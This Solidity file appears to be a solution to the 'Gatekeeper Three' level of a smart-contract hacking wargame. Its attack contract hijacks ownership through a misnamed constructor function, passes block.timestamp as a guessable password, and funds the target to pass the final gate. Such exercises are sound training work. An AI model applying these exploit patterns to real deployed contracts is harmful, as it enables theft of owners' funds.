// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ================================================================
// │                   LEVEL 28 - GATEKEEPER THREE                │
// ================================================================
interface IGatekeeperThree {
    function construct0r() external;
    function enter() external;
    function createTrick() external;
    function getAllowance(uint256 _password) external;
}

contract AttackContract {
    IGatekeeperThree gatekeeper;

    constructor(address targetContractAddress) payable {
        gatekeeper = IGatekeeperThree(targetContractAddress);
    }

    function attack() public {
        // ** Gate One **
        gatekeeper.construct0r();

        // ** Gate Two **
        gatekeeper.createTrick();
        gatekeeper.getAllowance(block.timestamp);

        // ** Gate Three **
        (bool success,) = address(gatekeeper).call{value: 0.002 ether}("");
        require(success);

        gatekeeper.enter();
    }
}
